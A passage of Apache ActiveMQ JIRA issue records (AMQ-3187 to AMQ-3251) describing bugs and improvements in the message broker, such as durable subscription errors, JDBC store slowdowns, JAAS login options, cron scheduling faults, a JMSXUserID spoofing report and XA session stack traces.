issueID:AMQ-3187
type:Bug
changed files:JmsConsumerClient.java
texts:IllegalMonitorStateException in default topic consumer of maven-activemq-perf-plugin
Running mvn activemq-perf:consumer -Dfactory.brokerURL=tcp://localhost:61616 -Dconsumer.destName=topic://Test -Dconsumer.sessAckMode=autoAck -Dconsumer.recvType=count generatesException in thread "JmsConsumer0 Thread" java.lang.IllegalMonitorStateException        at java.lang.Object.wait(Native Method)        at java.lang.Object.wait(Object.java:485)        at org.apache.activemq.tool.JmsConsumerClient.receiveAsyncCountBasedMessages(JmsConsumerClient.java:176)        at org.apache.activemq.tool.JmsConsumerClient.receiveMessages(JmsConsumerClient.java:54)        at org.apache.activemq.tool.JmsConsumerClient.receiveMessages(JmsConsumerClient.java:67)        at org.apache.activemq.tool.JmsConsumerClient.receiveMessages(JmsConsumerClient.java:72)        at org.apache.activemq.tool.JmsConsumerSystem.runJmsClient(JmsConsumerSystem.java:62)        at org.apache.activemq.tool.AbstractJmsClientSystem$1.run(AbstractJmsClientSystem.java:85)        at java.lang.Thread.run(Thread.java:619)Using -Dconsumer.asyncRecv=false resolves the problem.
issueID:AMQ-3188
type:Improvement
changed files:
texts:Full table scan for durable subs in jdbc store when priority enabled; very slow with large message backlog
Priority support is delegate to the DB, but it currently requires a full table scan to recover a new batch of messages. This can be very slow when the message table is large (a consumer has been offline for some time). With multiple concurrent consumers this gets worse.The store needs to use more internal state w.r.t priority such that simpler/faster queries are used.
issueID:AMQ-3190
type:Bug
changed files:
texts:Durable Subscription - missing messages when selector matching sub resumes after broker restart
Durable subs, online offline with a mix of filter matching and unmatched.Scenario, one offline durable sub with selector, lots of messages that don"t match, second durable sub with selector. Broker restart. After restart, publish matching messages. New messages get wrong order id within the broker, such that ids are reused and second sub misses messages.
issueID:AMQ-3192
type:Improvement
changed files:
texts:Add setTrustStore() and setKeyStore() methods to ActiveMQSslConnectionFactory class
Currently, it is somewhat awkward to use the ActiveMQSslConnectionFactory class, because the only way to set the trust store and the key store is to manipulate KeyManager and TrustManager classes directly. It would be much simpler, if you could simply specify the location of keystore files for the trust store and the key store. E.g. if you added methods like:setTrustStore(String)setTrustStorePassword(String)setKeyStore(String)setKeyStorePassword(String)
issueID:AMQ-3193
type:Bug
changed files:
texts:Consumers won&#39;t get msgs after JMX operation removeMatchingMessages() was called on a queue.
Follow these steps to reproduce the problem: start broker start a producer and send two or more messages to a queue start jconsole click on the queue and select Operations. click browse and copy the JMSMessageID of the first message into clipboard invoke JMX operation removeMatchingMessages() with argument JMSMessageID="<message id>" , where <message id> is the copied JMSMessageID. verify that >= 1 message are still on the queue now start a consumer that connects to this queue. It won"t get any messages.
issueID:AMQ-3195
type:Improvement
changed files:
texts:NetworkConnector initialization should be backed by an executor
If there are many network connectors and a slow network, starting serially means that the last network connector may have to wait for N slow connection establishment processes. If the connection initiation fails fast it is not really a problem as the start process can move on quickly.It should be possible to start network connectors using an executor such that they can start in parallel. Fast connections can be up an running immediately.
issueID:AMQ-3196
type:Improvement
changed files:DurableTopicSubscription.java
StoreDurableSubscriberCursor.java
StorePendingDurableSubscriberMessageStoragePolicy.java
VMPendingDurableSubscriberMessageStoragePolicy.java
FilePendingDurableSubscriberMessageStoragePolicy.java
PendingDurableSubscriberMessageStoragePolicy.java
ActiveMQMessageAuditNoSync.java
texts:Speed up initial message delivery for offline durable sub with keepDurableSubsActive=true and JDBC store
Follow on from https://issues.apache.org/jira/browse/AMQ-3188Durablesubs are kept active by default, but their cursors are stopped requiring a read of the store to determine the message backlog. With a large prioritised backlog and th JDBC store, getting the store size can be costly as it requires a full table scan.Currently there are three calls to getStoreSize, there should be only one when the sub is initially created.The implication is that on reactivation of an offline durable sub, there is a delay of an additional potentially slow jdbc call before dispatch resumes.
issueID:AMQ-3197
type:Improvement
changed files:
texts:Virtual destinations and wildcards
If you subscrie to the virtual topic queue with the wildcard, like queue://Consumer.a.test.> it will not receive messages if the particular destination (like queue://Consumer.a.test.1) does not exists.
issueID:AMQ-3198
type:Improvement
changed files:
texts:Allow JAAS GuestLoginModule to fail if users specify a password
The GuestLoginModule currently always allows login so it is a handy default. In the case where two login modules are configured, it is nice to have the guest login module only succeed if there are no password credentials such that the second module gets a chance to authenticate. This ensures that only anonymous users (or users that do not supply a password, map to guest, where as any user that supplies a password will have to pass authorization or fail.Without this option, and using GuestLoginModule sufficient, a failed authentication attempt will map you to the guest user.This enhancement will implement the credentialsInvalidate attribute.With the following config, if you don"t specify a password you are guest. If you do specify a valid username/password pair you will authenticate, else you are rejected.activemq-guest-when-no-creds-only-domain {    org.apache.activemq.jaas.GuestLoginModule sufficient       debug=true       credentialsInvalidate=true       org.apache.activemq.jaas.guest.user="guest"       org.apache.activemq.jaas.guest.group="guests";    org.apache.activemq.jaas.PropertiesLoginModule requisite        debug=true        org.apache.activemq.jaas.properties.user="org/apache/activemq/security/users.properties"        org.apache.activemq.jaas.properties.group="org/apache/activemq/security/groups.properties";};
issueID:AMQ-3199
type:Bug
changed files:
texts:CRON next scheduled time incorrectly calculated
A Cron Entry of "50 20 * * 5" with an AMQ_SCHEDULED_DELAY of 61000 (61 seconds) started at 2011-03-04 20:48:24. The last "5" in the Cron Entry specifies only Fridays and 2011-03-04 is a Friday. The cron job ran and set "next scheduled time" to be 2011-03-10 20:50:25. 2011-03-11 is a Thursday. The correct "next scheduled time" should be 2011-03-11 20:50:25; it should be Friday.In addition, the reason why I set the delay to 61000 was because with the default delay of 0, the job executes twice with a 60 second interval. I will file a separate issue.I believe the Cron Entry has a problem with using asterisks. I tried a Cron Entry of "27 19 1-31 1-12 6" which is a Saturday. It ran at 19:27 and then correctly set the "next scheduled time" to be on the next Saturday. This is a temporary workaround.
issueID:AMQ-3202
type:Bug
changed files:ActiveMQMapMessage.java
texts:Sending an Empty MapMessage over HttpTransport fails with exception
When sending a MapMessage with no body to a client that"s connected via HTTP an exception is thrown when the message is unmarshaled from XML and the copy method is invoked.
issueID:AMQ-3204
type:New Feature
changed files:DestinationPathSeparatorBroker.java
texts:Support non-standard destination path separators
Wildcards only work on destination paths, separated by standard separator (.), so FOO.>FOO.*.BARare valid. But if someone want to use non-standard path separator (like /)FOO/>FOO/*/BARwildcards in won"t work. Also, policy, security and other settings that use them will also be ignored.The easiest way to support this is to create a plugin that will convert destination names using non-standard path separator to default one, so clients can use whatever convention they want and broker config remains the same.
issueID:AMQ-3205
type:Improvement
changed files:ActiveMQConnectionRequestInfo.java
ActiveMQActivationSpec.java
MessageActivationSpec.java
ActiveMQConnectionSupport.java
texts:Update ActivationSpec
I like to submit this patch. We needed it in order to get access to the RedeliveryPolicy properties with the ActivationSpec
issueID:AMQ-3206
type:Bug
changed files:
texts:Unsubscribed durable sub can leave dangling message reference in kahaDB, visible after a restart
Unsubscribing a durable sub with kahaDB cleans up the expected ack locations but does not update the change to the persistent index. After a restart, the old state is recovered which can lead to invalid references to messages. These references can block journal file deletion when the message is ultimately consumed by all interested subs, Leading to data file build up. The necessary conditions are multiple durable subs with some unsubscribing with a remaining backlog along with broker restarts.
issueID:AMQ-3207
type:Improvement
changed files:
texts:Various improvements to features.xml possible with karaf-2.2
With karaf-2.2 various improvements are possible:1) defining war feature correctly2) using obr3) removing repository tag to allow a wider range of karaf versions
issueID:AMQ-3209
type:Bug
changed files:
texts:URISupport.createURIWithQuery() fails on some composite uris.
URISupport.createURIWithQuery() fails on composite URIs that have an inner query but not an outer query, e.g.:outerscheme:(innerscheme:innerssp?innerquery=0)The failure is due to the method not taking into account this possibility and assuming the query consists of everything  after the last question mark.  The attached patch adds a test case in org.apache.activemq.util.URISupportTest that demonstrates the problem, and also modifies URISupport.createURIWithQuery() with a suggested fix for the problem.
issueID:AMQ-3211
type:Bug
changed files:
texts:JMSXUserId Can be spoofed by client
It seems the JMSXUserId can be spoofed by client contrary to what http://activemq.apache.org/jmsxuserid.html says.My test setup is populateJMSXUserID="true set in a single broker, a JAAS config org.apache.activemq.jaas.TextFileCertificateLoginModule and using mutual auth SSL (i.e., ?needClientAuth=true for transportConnector setup), and a single consumer and producer based on small modifications of the ConsumerTool and ProducerTool examples in the 5.4.2 distro.  See attached the changes to the distro package to demonstrate the bug. Just do1. run apache-activemq-5.4.2/bin/activemq-admin start2. in apache-activemq-5.4.2/example run ant consumer -Durl=ssl://localhost:61617 -Dmax=3 -Dverbose=true3. in another shell in apache-activemq-5.4.2/example run ant producer -Durl=ssl://localhost:61617 -Dmax=3 -Dverbose=true4. look at the output of the consumer for the properties printed after each received message (the producer spoofs only on even numbered messages)When the client does not set the property, then i get the properly authenticated DN as JMSXUserID using message.getStringProperty("JMSXUserID"). However, when the client sets it, i get the value set by the client.  The only difference i notice is that in the former case, message.getPropertyNames() does not return JMSXUserID whereas in the spoofed case it does. i wonder whether in the context of https://issues.apache.org/jira/browse/QPID-943 or https://issues.apache.org/jira/browse/AMQ-2840 (which interestingly doesn"t list JMSXUserID as supported in a comment even though it is?) something got messed up?
issueID:AMQ-3214
type:Bug
changed files:InactivityMonitor.java
texts:"InactivityMonitor Async Task" threads leaking
-Have a multi-thread consumers running to consumer messages-Have Connection to have these :         ActiveMQConnectionFactory connectionFactory = new ActiveMQConnectionFactory(brokerUrl);  connectionFactory.setUseAsyncSend(false);  connectionFactory.setDispatchAsync(false);  connectionFactory.setAlwaysSessionAsync(false);  connectionFactory.setAlwaysSyncSend(true);-Run the consumers for several hours and profile it-You will see there are threads with the name "InactivityMonitor Async Task" being spawning continuouslyThis will cause the entire consumer system to slow down eventually due to thread context switching.  Suggestion to fix: we should not put a limit on the number of "InactivityMonitor Async Task" threads to be Max Integer.  There is a bug in Java lib thatit will not stop a thread after a given idle time-to-live. We could fix this in the file InactivityMonitor.java
issueID:AMQ-3215
type:Improvement
changed files:
texts:Drop-down list to move messages from one queue to another is not wide enough to show complete queue names
The drop-down list to move messages from one queue to another is not wide enough to show complete queue names. When queue names are similar in name, one has to guess the correct line in the drop down list because it is too confusing (or view source and determine from page code).
issueID:AMQ-3218
type:Improvement
changed files:pom.xml
Queue.java
texts:Mutlitple Exclusive Consumers: It is currently not possible to always ensure that a new exclusive consumer replaces any existing one
The following is a proposed small change to org.apache.activemq.broker.region.Queue addSubscription() method: If the new consumer is exclusive and has the maximum priority (127), replace the existing exclusive consumer even if it also has a priority of 127 as follows (line 385 in version 5.4.2 source): if (exclusiveConsumer == null) {   exclusiveConsumer = sub; } else if (sub.getConsumerInfo().getPriority() == Byte.MAX_VALUE) {   exclusiveConsumer = sub; } else if (sub.getConsumerInfo().getPriority() > exclusiveConsumer.getConsumerInfo().getPriority()) {   exclusiveConsumer = sub; } This allows new consumers to always replace any existing exclusive consumer (but preserves behaviour in all but 1 unusual case). There may be a better way of donig this (e.g. adding an ExclusiveMode property to ConsumerInfo with values such as "PRIORITY", "NEWEST" which determines whether the priority is checked or the latest exclusive consumer replaces an y existing one) but the above is a quick fix for this problem. The reason, we have added this to our implementation is that we have an application that uses a STOMP client on Windows Mobile to post messages to a queue and wait for the reply. However, when the device goes to sleep, the TCP socket remains open on the server even though it is forceably closed on wake-up on the client. The client then creates a new connection and we end up with multiple consumers on our queue with new messages being distributed between them. If we turn on exclusivity, the original consumer gets all the messages which doesn"t help (it actually makes it worse).
issueID:AMQ-3219
type:New Feature
changed files:
texts:Enable MDC logging
Provide more information in logs using MDC, to enable easier debugging in complex environments
issueID:AMQ-3220
type:Bug
changed files:
texts:Wildcards do not work with included destinations for network connectors.
I think this is related to old issue (https://issues.apache.org/jira/browse/AMQ-1629) and that there"s a general issue with filter matching while determining if destination is permissible
issueID:AMQ-3222
type:Bug
changed files:XBeanBrokerFactory.java
texts:Failover and SimpleDiscovery - query parameters getting dropped
Using failover with static discovery makes sense in a master slave scenario. With simple static discovery with a pair of uri"s, <networkConnector uri="static:(tcp://localhost:32258,tcp://localhost:32259)" /> static discovery will continue to try and connect to both uris which leads to repeated logging of failed attempts to bridge to the slave that is not active yet.Using failover<networkConnector uri="static:(failover:(tcp://localhost:32258,tcp://localhost:32259)?randomize=false&amp;maxReconnectAttempts=1)"/> improves on this as the failover: transport will be content with just one uri, from the broker perspective there is a single network bridge, rather than two.Currently query parameter are not correctly applied.Query parameter parsing is problematic when options for a transport are duplicated by the discovery mechanism, e.g: maxReconnectAttempts. There have been some related efforts to resolve this, https://issues.apache.org/jira/browse/AMQ-2981 and https://issues.apache.org/jira/browse/AMQ-2598. Parameters are stripped from transport uris and applied to both the transport and the discovery mechanism. The end result, and fix, is that additional transport options that need to be applied to discovered transport (which typically have all query parameters removed) need to be isolated from normal query parameters using a dot (prefixed with "discovered.") notation. e.g: discovery:(multicast://default)?initialReconnectDelay=100&discovered.closeAsync=false"
issueID:AMQ-3224
type:Improvement
changed files:
texts:Redelivery per destination
Please make it possible to define redelivery policies per Destination instead per Connection factory.For more info see the related forum post:http://activemq.2283324.n4.nabble.com/RedeliveryPolicy-per-destination-td3384640.html
issueID:AMQ-3227
type:Improvement
changed files:
texts:Support synchronous sending in ActiveMQ streams
I ran in to broker memory issues using JMS streams and from reading the Producer Flow Control documentation I thought I could resolve this by always using sync sends. However, I noticed that streams always use async sends.Can support be added to optionally use sync sends for JMS streams?
issueID:AMQ-3231
type:Improvement
changed files:
texts:Stomp Frame should mask passcode header in toString output, so it does not pollute the log
Logging of stomp CONNECT frame includes the raw passcode. This should be masked with "****"so instead of:22011-03-18 09:38:30,634 [38.171.43:40701] WARN TransportConnection - Failed to add Connection ID:xx.xx.38456-99-2:3, reason: java.lang.SecurityException: User name or password is invalid.2011-03-18 09:38:30,634 [38.171.43:40701] WARN ProtocolConverter - Exception occurred processing:CONNECThost:big77accept-version:1.0,1.1passcode:barlogin:foo it should be:22011-03-18 09:38:30,634 [38.171.43:40701] WARN TransportConnection - Failed to add Connection ID:xx.xx.38456-99-2:3, reason: java.lang.SecurityException: User name or password is invalid.2011-03-18 09:38:30,634 [38.171.43:40701] WARN ProtocolConverter - Exception occurred processing:CONNECThost:big77accept-version:1.0,1.1passcode:*****login:foo
issueID:AMQ-3233
type:Bug
changed files:
texts:warnOnProducerFlowControl is never reset to &#39;true&#39; after the first INFO message is logged.
Looking at the code in Queue.java (around line 543), you can see that the warnOnProducerFlowControl variable is set to false when we log the INFO message "Usage Manager Memory Limit (...) reached on ....". However, it is never set to true again. So, if we consider operations users trawling through large logs over a period of time, the may see the first warning on Monday, but then see no further warnings of this behavior for the rest of the week. Surely we should be resetting the warnOnProducerFlowControl variable to true, so that subsequent flow control situations are correctly logged?
issueID:AMQ-3235
type:Improvement
changed files:
texts:Upgrade Camel
Upgrade Camel to its latest snapshot and trim down the web console
issueID:AMQ-3236
type:New Feature
changed files:ActiveMQMessage.java
texts:In the case of DLQ processing due to an exception from onMessage, provide the exception string as a message property
When an application throws an exception from on message, redelivery kicks in through session rollback. If the policy dictates that the message should be sent to the DLQ, the exception cause is lost. The enhancement would pipe the exception with the internal poison ack such that it can be included as a message property in the message in the DLQ.Some context in the answer http://stackoverflow.com/questions/5069733/preservation-of-exception-cause-when-redelivering-failed-activemq-jms-messages-pr/5109361#5109361
issueID:AMQ-3237
type:Improvement
changed files:ControlFile.java
LockFile.java
KahaStore.java
IndexManager.java
AMQPersistenceAdapter.java
texts:FileLock.tryLock() doesn&#39;t work well in all environments
Due to JRE issue http://bugs.sun.com/view_bug.do?bug_id=6628575 FileLock.tryLock() doesn"t work correctly on all file systems.It"s recommended to use FileLock lock = fc.tryLock(0, fc.size(), false);instead
issueID:AMQ-3238
type:Bug
changed files:
texts:Topic-Messages not redelivered to durable subscription after rollback and reconnect
Durable sub acks ignore the transaction boundary, such that a rollback is ignored. The correct addition of rollback on close exposed this b/c transaction completion became an effective commit or the ack or receipt.
issueID:AMQ-3241
type:Improvement
changed files:ActiveMQMessageProducerSupport.java
texts:"Unkown" is an incorrect spelling in ActiveMQMessageProducerSupport.java
"Unkown" is misspelled in ActiveMQMessageProducerSupport.javaExample: 13:13:32 ERROR javax.jms.IllegalStateException: unkown delivery mode: 0Obviously, it should be "Unknown".
issueID:AMQ-3242
type:Improvement
changed files:ActiveMQPrefetchPolicy.java
texts:Change prefetch size limit for topics from 32766 to 32767
The default prefetch size limit for topics is noted as 32766; http://activemq.apache.org/performance-tuning.htmlThe FUSE source documentation (http://fusesource.com/docs/broker/5.4/tuning/index.html) states, "Default prefetch limit is 32766. The default limit of 32766 is the largest value of a short and is the maximum possible value of the prefetch limit.".The largest value for a short actually is 32767 (http://java.sun.com/docs/books/jls/second_edition/html/typesValues.doc.html).This is really a trivial issue, but should the default prefetch limit for topics be changed from 32766 to 32767 to reflect the actual ceiling?And of course, I would recommend changing the automatic setting to 32767, when the maximum has been exceeded.  The following warning shows the applied default of 32766:16:22:40 WARN  maximum prefetch limit has been reset from 50000 to 32766
issueID:AMQ-3244
type:Improvement
changed files:PropertiesLoginModule.java
texts:Enable PropertiesLoginModule JAAS module to optionally cache values in memory
Currently, PropertiesLoginModule will load users.properties and groups.properties files on every connection. While this is OK in most cases, in some (Stomp where connections come and go frequently) this can cause performance issues.We should provide configuration parameter (reload=false which will make module to cache values of these files in memory. The example config is here:activemq-domain {    org.apache.activemq.jaas.PropertiesLoginModule required        debug=true        reload=false        org.apache.activemq.jaas.properties.user="org/apache/activemq/security/users.properties"        org.apache.activemq.jaas.properties.group="org/apache/activemq/security/groups.properties";};
issueID:AMQ-3246
type:Improvement
changed files:
texts:Using Ant 1.8.x to run examples causes warning in output
When running the producer in the examples using Ant 1.8.x, the following warning will be output during compilation: compile:    &#91;javac&#93; /Users/bsnyder/amq/apache-activemq-5.5.0/example/build.xml:151: warning: "includeantruntime" was not set, defaulting to build.sysclasspath=last; set to false for repeatable builds
issueID:AMQ-3247
type:Improvement
changed files:AbstractJmxCommand.java
texts:ensure that activemq-console command like activemq:list/activemq:query/activemq:bstat can work in servicemix container out-of-box
This issue is actually in Servicemix4 we can"t use activemq-console command like activemq:list/activemq:query/activemq:bstat out-of-box with default option, more details from SMX4-784&#91;1&#93;&#91;1&#93;https://issues.apache.org/jira/browse/SMX4-784
issueID:AMQ-3248
type:Improvement
changed files:
texts:Allow for easy externalization of ActiveMQ configuration
Currently many of the AMQ configuration files use the property activemq.base to load in other configuration files, e.g. activemq.xml:activmeq.xml<property name="locations">  <value>file:${activemq.base}/conf/credentials.properties</value></property>      jetty.xml:jetty.xml<bean id="securityLoginService" class="org.eclipse.jetty.security.HashLoginService">  <property name="name" value="ActiveMQRealm" />  <property name="config" value="${activemq.base}/conf/jetty-realm.properties" /></bean>webconsole-embedded.xml:webconsole-embedded.xml<property name="locations">  <value>file:${activemq.base}/conf/credentials.properties</value></property>and others.In case where you want to externalize the entire ActiveMQ configuration into a folder that is not a sub folder of AMQ, there is the need to change multiple configuration files. This is error prone. In order to make the use of external AMQ configuration more easy to use, I suggest to 1. Make use of the already existing environment variable ACTIVEMQ_CONFIG_DIR which points to ${ACTIVEMQ_BASE}/conf by default in bin/activemq script. 2. Map the environment variable to the Java variable activemq.conf in bin/activemq script2. Replace all occurences of ${activemq.base}/conf with {$activemq.conf} in all XML configuration files (including those in webapps/ folder)That way one can simply point to an external ActiveMQ conf folder by setting the shell environment variable ACTIVE_CONFIG_DIR to that folder. It does not have to be set in the bin/activemq script, it can be set directly on the shell.
issueID:AMQ-3249
type:Improvement
changed files:
texts:Remove lib needed for JDK 1.5
As now JDK6 is required, we can remove dependency on JAXB, Stax and other similar libs, included in JDK6
issueID:AMQ-3251
type:Bug
changed files:
texts:javax.jms.TransactionInProgressException: Cannot rollback() inside an XASession
The following error is generated when trying to configure ActiveMQ with JTA/XA15:09:39,373 | WARN  | tenerContainer-1 | PooledSession                    | 47 - org.apache.activemq.activemq-pool - 5.4.2.fuse-03-09 | Caught exception trying rollback() when putting session back into the pool: javax.jms.TransactionInProgressException: Cannot rollback() inside an XASessionjavax.jms.TransactionInProgressException: Cannot rollback() inside an XASession at org.apache.activemq.ActiveMQXASession.rollback(ActiveMQXASession.java:76) at org.apache.activemq.pool.PooledSession.close(PooledSession.java:111) at org.apache.activemq.pool.XaConnectionPool$Synchronization.afterCompletion(XaConnectionPool.java:90) at org.apache.geronimo.transaction.manager.TransactionImpl.afterCompletion(TransactionImpl.java:542) at org.apache.geronimo.transaction.manager.TransactionImpl.afterCompletion(TransactionImpl.java:535) at org.apache.geronimo.transaction.manager.TransactionImpl.commit(TransactionImpl.java:326) at org.apache.geronimo.transaction.manager.TransactionManagerImpl.commit(TransactionManagerImpl.java:250) at org.springframework.transaction.jta.JtaTransactionManager.doCommit(JtaTransactionManager.java:1009) at org.springframework.transaction.support.AbstractPlatformTransactionManager.processCommit(AbstractPlatformTransactionManager.java:754) at org.springframework.transaction.support.AbstractPlatformTransactionManager.commit(AbstractPlatformTransactionManager.java:723) at org.apache.aries.transaction.GeronimoPlatformTransactionManager.commit(GeronimoPlatformTransactionManager.java:76) at sun.reflect.GeneratedMethodAccessor519.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)[:1.6.0_24] at java.lang.reflect.Method.invoke(Method.java:597)[:1.6.0_24] at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:309)[60:org.springframework.aop:3.0.5.RELEASE] at org.springframework.osgi.service.importer.support.internal.aop.ServiceInvoker.doInvoke(ServiceInvoker.java:58)[71:org.springframework.osgi.core:1.2.0] at org.springframework.osgi.service.importer.support.internal.aop.ServiceInvoker.invoke(ServiceInvoker.java:62)[71:org.springframework.osgi.core:1.2.0] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)[60:org.springframework.aop:3.0.5.RELEASE] at org.springframework.aop.support.DelegatingIntroductionInterceptor.doProceed(DelegatingIntroductionInterceptor.java:131)[60:org.springframework.aop:3.0.5.RELEASE] at org.springframework.aop.support.DelegatingIntroductionInterceptor.invoke(DelegatingIntroductionInterceptor.java:119)[60:org.springframework.aop:3.0.5.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)[60:org.springframework.aop:3.0.5.RELEASE] at org.springframework.osgi.service.util.internal.aop.ServiceTCCLInterceptor.invokeUnprivileged(ServiceTCCLInterceptor.java:56)[71:org.springframework.osgi.core:1.2.0] at org.springframework.osgi.service.util.internal.aop.ServiceTCCLInterceptor.invoke(ServiceTCCLInterceptor.java:39)[71:org.springframework.osgi.core:1.2.0] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)[60:org.springframework.aop:3.0.5.RELEASE] at org.springframework.osgi.service.importer.support.LocalBundleContextAdvice.invoke(LocalBundleContextAdvice.java:59)[71:org.springframework.osgi.core:1.2.0] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)[60:org.springframework.aop:3.0.5.RELEASE] at org.springframework.aop.support.DelegatingIntroductionInterceptor.doProceed(DelegatingIntroductionInterceptor.java:131)[60:org.springframework.aop:3.0.5.RELEASE] at org.springframework.aop.support.DelegatingIntroductionInterceptor.invoke(DelegatingIntroductionInterceptor.java:119)[60:org.springframework.aop:3.0.5.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)[60:org.springframework.aop:3.0.5.RELEASE] at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:202)[60:org.springframework.aop:3.0.5.RELEASE] at $Proxy409.commit(Unknown Source)[:] at org.springframework.jms.listener.AbstractPollingMessageListenerContainer.receiveAndExecute(AbstractPollingMessageListenerContainer.java:257)[110:org.springframework.jms:3.0.5.RELEASE] at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.invokeListener(DefaultMessageListenerContainer.java:1058)[110:org.springframework.jms:3.0.5.RELEASE] at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.executeOngoingLoop(DefaultMessageListenerContainer.java:1050)[110:org.springframework.jms:3.0.5.RELEASE] at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.run(DefaultMessageListenerContainer.java:947)[110:org.springframework.jms:3.0.5.RELEASE] at java.lang.Thread.run(Thread.java:680)[:1.6.0_24]15:09:39,381 | WARN  | tenerContainer-1 | Transaction                      | 49 - org.apache.aries.transaction.manager - 0.2.0.incubating | Unexpected exception from afterCompletion; continuingjava.lang.RuntimeException: javax.jms.JMSException: Failed to invalidate session: org.apache.activemq.AlreadyClosedException: Cannot use The session has already been closed as it has already been closed at org.apache.activemq.pool.XaConnectionPool$Synchronization.afterCompletion(XaConnectionPool.java:93) at org.apache.geronimo.transaction.manager.TransactionImpl.afterCompletion(TransactionImpl.java:542) at org.apache.geronimo.transaction.manager.TransactionImpl.afterCompletion(TransactionImpl.java:535) at org.apache.geronimo.transaction.manager.TransactionImpl.commit(TransactionImpl.java:326) at org.apache.geronimo.transaction.manager.TransactionManagerImpl.commit(TransactionManagerImpl.java:250) at org.springframework.transaction.jta.JtaTransactionManager.doCommit(JtaTransactionManager.java:1009) at org.springframework.transaction.support.AbstractPlatformTransactionManager.processCommit(AbstractPlatformTransactionManager.java:754) at org.springframework.transaction.support.AbstractPlatformTransactionManager.commit(AbstractPlatformTransactionManager.java:723) at org.apache.aries.transaction.GeronimoPlatformTransactionManager.commit(GeronimoPlatformTransactionManager.java:76) at sun.reflect.GeneratedMethodAccessor519.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)[:1.6.0_24] at java.lang.reflect.Method.invoke(Method.java:597)[:1.6.0_24] at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:309)[60:org.springframework.aop:3.0.5.RELEASE] at org.springframework.osgi.service.importer.support.internal.aop.ServiceInvoker.doInvoke(ServiceInvoker.java:58)[71:org.springframework.osgi.core:1.2.0] at org.springframework.osgi.service.importer.support.internal.aop.ServiceInvoker.invoke(ServiceInvoker.java:62)[71:org.springframework.osgi.core:1.2.0] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)[60:org.springframework.aop:3.0.5.RELEASE] at org.springframework.aop.support.DelegatingIntroductionInterceptor.doProceed(DelegatingIntroductionInterceptor.java:131)[60:org.springframework.aop:3.0.5.RELEASE] at org.springframework.aop.support.DelegatingIntroductionInterceptor.invoke(DelegatingIntroductionInterceptor.java:119)[60:org.springframework.aop:3.0.5.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)[60:org.springframework.aop:3.0.5.RELEASE] at org.springframework.osgi.service.util.internal.aop.ServiceTCCLInterceptor.invokeUnprivileged(ServiceTCCLInterceptor.java:56)[71:org.springframework.osgi.core:1.2.0] at org.springframework.osgi.service.util.internal.aop.ServiceTCCLInterceptor.invoke(ServiceTCCLInterceptor.java:39)[71:org.springframework.osgi.core:1.2.0] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)[60:org.springframework.aop:3.0.5.RELEASE] at org.springframework.osgi.service.importer.support.LocalBundleContextAdvice.invoke(LocalBundleContextAdvice.java:59)[71:org.springframework.osgi.core:1.2.0] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)[60:org.springframework.aop:3.0.5.RELEASE] at org.springframework.aop.support.DelegatingIntroductionInterceptor.doProceed(DelegatingIntroductionInterceptor.java:131)[60:org.springframework.aop:3.0.5.RELEASE] at org.springframework.aop.support.DelegatingIntroductionInterceptor.invoke(DelegatingIntroductionInterceptor.java:119)[60:org.springframework.aop:3.0.5.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)[60:org.springframework.aop:3.0.5.RELEASE] at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:202)[60:org.springframework.aop:3.0.5.RELEASE] at $Proxy409.commit(Unknown Source)[:] at org.springframework.jms.listener.AbstractPollingMessageListenerContainer.receiveAndExecute(AbstractPollingMessageListenerContainer.java:257)[110:org.springframework.jms:3.0.5.RELEASE] at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.invokeListener(DefaultMessageListenerContainer.java:1058)[110:org.springframework.jms:3.0.5.RELEASE] at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.executeOngoingLoop(DefaultMessageListenerContainer.java:1050)[110:org.springframework.jms:3.0.5.RELEASE] at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.run(DefaultMessageListenerContainer.java:947)[110:org.springframework.jms:3.0.5.RELEASE] at java.lang.Thread.run(Thread.java:680)[:1.6.0_24]Caused by: javax.jms.JMSException: Failed to invalidate session: org.apache.activemq.AlreadyClosedException: Cannot use The session has already been closed as it has already been closed at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:35) at org.apache.activemq.pool.SessionPool.invalidateSession(SessionPool.java:77) at org.apache.activemq.pool.PooledSession.close(PooledSession.java:123) at org.apache.activemq.pool.XaConnectionPool$Synchronization.afterCompletion(XaConnectionPool.java:90) ... 33 moreCaused by: org.apache.activemq.AlreadyClosedException: Cannot use The session has already been closed as it has already been closed at org.apache.activemq.pool.PooledSession.getInternalSession(PooledSession.java:291) at org.apache.activemq.pool.SessionPool.destroyObject(SessionPool.java:90) at org.apache.commons.pool.impl.GenericObjectPool.invalidateObject(GenericObjectPool.java:1258) at org.apache.activemq.pool.SessionPool.invalidateSession(SessionPool.java:75)Here is the config used to access to AMQ Broker    <!-- Tx Manager -->    <osgi:reference 